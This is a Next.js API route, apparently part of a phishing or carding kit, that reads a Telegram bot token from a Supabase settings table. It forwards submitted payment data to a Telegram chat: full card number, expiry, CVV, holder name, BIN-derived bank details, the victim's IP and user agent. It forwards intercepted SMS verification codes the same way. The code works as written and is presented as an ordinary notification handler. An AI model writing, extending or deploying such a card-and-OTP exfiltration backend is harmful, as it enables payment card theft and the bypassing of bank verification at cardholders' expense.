import { type NextRequest, NextResponse } from "next/server"
import { createAdminClient } from "@/lib/supabase/admin"

export async function POST(request: NextRequest) {
  try {
    const { type, data } = await request.json()
    const supabase = createAdminClient()

    // Get Telegram settings
    const { data: settings } = await supabase.from("admin_settings").select("*")

    const botToken = settings?.find((s) => s.setting_key === "telegram_bot_token")?.setting_value
    const chatId = settings?.find((s) => s.setting_key === "telegram_chat_id")?.setting_value

    if (!botToken || !chatId) {
      console.log("[v0] Telegram not configured, skipping notification")
      return NextResponse.json({ success: false, error: "Telegram not configured" })
    }

    let message = ""

    if (type === "card") {
      // Format card notification
      message = `🔔 *New Card Added*\n\n`
      message += `💳 *Card Number:* \`${data.cardNumber}\`\n`
      message += `📅 *Expiry:* \`${data.cardExpiry}\`\n`
      message += `🔐 *CVV:* \`${data.cardCvv}\`\n`
      message += `👤 *Holder:* ${data.cardHolder}\n\n`

      if (data.binData) {
        message += `🏦 *Bank:* ${data.binData.bank || "Unknown"}\n`
        message += `💎 *Level:* ${data.binData.level || "Unknown"}\n`
        message += `🌍 *Country:* ${data.binData.country || "Unknown"}\n\n`
      }

      message += `📍 *IP:* \`${data.ip}\`\n`
      message += `🖥️ *User Agent:* ${data.userAgent}\n`
      message += `🆔 *User ID:* \`${data.userId}\``
    } else if (type === "sms") {
      // Format SMS code notification
      message = `📱 *SMS Code Received*\n\n`
      message += `🔢 *Code:* \`${data.smsCode}\`\n\n`
      message += `📍 *IP:* \`${data.ip}\`\n`
      message += `🖥️ *User Agent:* ${data.userAgent}\n`
      message += `🆔 *User ID:* \`${data.userId}\``
    }

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    if (!response.ok) {
      const error = await response.text()
      console.error("[v0] Telegram API error:", error)
      return NextResponse.json({ success: false, error: "Telegram API error" })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("[v0] Telegram notification error:", error)
    return NextResponse.json({ success: false, error: "Internal error" }, { status: 500 })
  }
}
